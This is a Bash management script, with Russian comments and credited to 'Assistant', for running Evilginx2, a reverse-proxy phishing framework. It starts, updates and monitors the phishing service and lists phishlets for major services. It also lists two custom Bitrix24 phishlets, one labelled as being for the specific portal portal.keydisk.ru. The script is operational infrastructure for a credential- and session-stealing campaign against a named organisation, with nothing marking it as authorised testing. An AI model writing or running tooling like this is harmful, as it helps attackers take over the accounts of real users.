#!/bin/bash

# Evilginx2 Manager - Управление сервисом Evilginx2
# Автор: Assistant

# Цвета для вывода
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Функции логирования
log() { echo -e "${BLUE}[INFO]${NC} $1"; }
error() { echo -e "${RED}[ERROR]${NC} $1"; }
success() { echo -e "${GREEN}[SUCCESS]${NC} $1"; }
warning() { echo -e "${YELLOW}[WARNING]${NC} $1"; }

# Проверка прав root
check_root() {
    if [[ $EUID -ne 0 ]]; then
        error "Требуются права root. Используйте sudo"
        exit 1
    fi
}

# Проверка установки Evilginx2
check_installation() {
    if ! command -v evilginx &> /dev/null; then
        error "Evilginx2 не установлен. Сначала запустите install_evilginx2.sh"
        exit 1
    fi
}

# Показать статус сервиса
show_status() {
    log "Статус сервиса Evilginx2:"
    systemctl status evilginx2 --no-pager -l
}

# Запуск сервиса
start_service() {
    log "Запуск сервиса Evilginx2..."
    systemctl start evilginx2
    sleep 2
    if systemctl is-active --quiet evilginx2; then
        success "Сервис Evilginx2 запущен"
        show_status
    else
        error "Не удалось запустить сервис"
        show_logs
    fi
}

# Остановка сервиса
stop_service() {
    log "Остановка сервиса Evilginx2..."
    systemctl stop evilginx2
    sleep 1
    if ! systemctl is-active --quiet evilginx2; then
        success "Сервис Evilginx2 остановлен"
    else
        error "Не удалось остановить сервис"
    fi
}

# Перезапуск сервиса
restart_service() {
    log "Перезапуск сервиса Evilginx2..."
    systemctl restart evilginx2
    sleep 2
    if systemctl is-active --quiet evilginx2; then
        success "Сервис Evilginx2 перезапущен"
        show_status
    else
        error "Не удалось перезапустить сервис"
        show_logs
    fi
}

# Включить автозапуск
enable_autostart() {
    log "Включение автозапуска Evilginx2..."
    systemctl enable evilginx2
    success "Автозапуск включен"
}

# Отключить автозапуск
disable_autostart() {
    log "Отключение автозапуска Evilginx2..."
    systemctl disable evilginx2
    success "Автозапуск отключен"
}

# Показать логи
show_logs() {
    log "Последние логи сервиса Evilginx2:"
    journalctl -u evilginx2 --no-pager -l --since "1 hour ago"
}

# Следить за логами в реальном времени
follow_logs() {
    log "Отслеживание логов в реальном времени (Ctrl+C для выхода):"
    journalctl -u evilginx2 -f
}

# Запуск в интерактивном режиме
run_interactive() {
    log "Запуск Evilginx2 в интерактивном режиме..."
    warning "Сначала остановим сервис если он запущен..."
    
    if systemctl is-active --quiet evilginx2; then
        systemctl stop evilginx2
        log "Сервис остановлен"
    fi
    
    log "Запуск в интерактивном режиме (Ctrl+C для выхода):"
    cd /root/evilginx2-data
    evilginx -p /root/evilginx2-data/phishlets -t /root/evilginx2-data/redirectors -c /root/evilginx2-data
}

# Показать конфигурацию
show_config() {
    log "Конфигурация Evilginx2:"
    echo -e "${YELLOW}Исходный код:${NC} /root/evilginx2/"
    echo -e "${YELLOW}Рабочая директория:${NC} /root/evilginx2-data/"
    echo -e "${YELLOW}Phishlets:${NC} /root/evilginx2-data/phishlets/"
    echo -e "${YELLOW}Redirectors:${NC} /root/evilginx2-data/redirectors/"
    echo -e "${YELLOW}База данных:${NC} /root/evilginx2-data/database/"
    echo -e "${YELLOW}Systemd сервис:${NC} /etc/systemd/system/evilginx2.service"
    echo -e "${YELLOW}Бинарник:${NC} /usr/local/bin/evilginx"
}

# Показать доступные phishlets
show_phishlets() {
    log "Доступные phishlets:"
    if [[ -d "/root/evilginx2-data/phishlets" ]]; then
        echo -e "${YELLOW}Всего phishlets:${NC} $(ls -1 /root/evilginx2-data/phishlets/*.yaml 2>/dev/null | wc -l)"
        echo ""
        ls -la /root/evilginx2-data/phishlets/ | grep -v "^total" | head -20
        echo ""
        echo -e "${BLUE}Популярные сервисы:${NC}"
        for service in google facebook microsoft o365 amazon paypal linkedin github; do
            count=$(ls -1 /root/evilginx2-data/phishlets/ | grep -i "$service" | wc -l)
            if [[ $count -gt 0 ]]; then
                echo -e "  ${GREEN}$service:${NC} $count phishlet(s)"
            fi
        done
        
        echo ""
        echo -e "${BLUE}Кастомные phishlets:${NC}"
        if [[ -f "/root/evilginx2-data/phishlets/bitrix24-keydisk.yaml" ]]; then
            echo -e "  ${GREEN}bitrix24-keydisk:${NC} Для portal.keydisk.ru"
        fi
        if [[ -f "/root/evilginx2-data/phishlets/bitrix24-universal.yaml" ]]; then
            echo -e "  ${GREEN}bitrix24-universal:${NC} Универсальный Bitrix24"
        fi
    else
        warning "Директория phishlets не найдена"
    fi
}

# Обновление Evilginx2
update_evilginx() {
    log "Обновление Evilginx2..."
    
    # Остановка сервиса
    if systemctl is-active --quiet evilginx2; then
        systemctl stop evilginx2
        log "Сервис остановлен"
    fi
    
    # Обновление исходного кода
    cd /root/evilginx2
    git pull origin master
    
    # Перекомпиляция
    make build
    
    # Обновление бинарника
    cp /root/evilginx2/build/evilginx /usr/local/bin/
    chmod +x /usr/local/bin/evilginx
    
    # Обновление phishlets и redirectors
    if [[ -d "/root/evilginx2/phishlets" ]]; then
        cp -r /root/evilginx2/phishlets/* /root/evilginx2-data/phishlets/ 2>/dev/null || true
    fi
    
    if [[ -d "/root/evilginx2/redirectors" ]]; then
        cp -r /root/evilginx2/redirectors/* /root/evilginx2-data/redirectors/ 2>/dev/null || true
    fi
    
    success "Evilginx2 обновлен"
    
    # Запуск сервиса обратно
    systemctl start evilginx2
    log "Сервис перезапущен"
}

# Показать меню
show_menu() {
    echo -e "${GREEN}"
    echo "=========================================="
    echo "         Evilginx2 Manager"
    echo "=========================================="
    echo -e "${NC}"
    echo -e "${BLUE}1.${NC} Показать статус сервиса"
    echo -e "${BLUE}2.${NC} Запустить сервис"
    echo -e "${BLUE}3.${NC} Остановить сервис"
    echo -e "${BLUE}4.${NC} Перезапустить сервис"
    echo -e "${BLUE}5.${NC} Включить автозапуск"
    echo -e "${BLUE}6.${NC} Отключить автозапуск"
    echo -e "${BLUE}7.${NC} Показать логи"
    echo -e "${BLUE}8.${NC} Следить за логами"
    echo -e "${BLUE}9.${NC} Запустить интерактивно"
    echo -e "${BLUE}10.${NC} Показать конфигурацию"
    echo -e "${BLUE}11.${NC} Показать phishlets"
    echo -e "${BLUE}12.${NC} Обновить Evilginx2"
    echo -e "${BLUE}0.${NC} Выход"
    echo
}

# Основная функция
main() {
    check_root
    check_installation
    
    # Если передан аргумент, выполняем действие напрямую
    case "$1" in
        "status") show_status ;;
        "start") start_service ;;
        "stop") stop_service ;;
        "restart") restart_service ;;
        "enable") enable_autostart ;;
        "disable") disable_autostart ;;
        "logs") show_logs ;;
        "follow") follow_logs ;;
        "interactive") run_interactive ;;
        "config") show_config ;;
        "phishlets") show_phishlets ;;
        "update") update_evilginx ;;
        *)
            # Интерактивное меню
            while true; do
                show_menu
                read -p "Выберите действие: " choice
                
                case $choice in
                    1) show_status ;;
                    2) start_service ;;
                    3) stop_service ;;
                    4) restart_service ;;
                    5) enable_autostart ;;
                    6) disable_autostart ;;
                    7) show_logs ;;
                    8) follow_logs ;;
                    9) run_interactive ;;
                    10) show_config ;;
                    11) show_phishlets ;;
                    12) update_evilginx ;;
                    0) 
                        log "Выход..."
                        exit 0
                        ;;
                    *)
                        error "Неверный выбор. Попробуйте снова."
                        ;;
                esac
                
                echo
                read -p "Нажмите Enter для продолжения..."
                clear
            done
            ;;
    esac
}

# Запуск основной функции
main "$@"
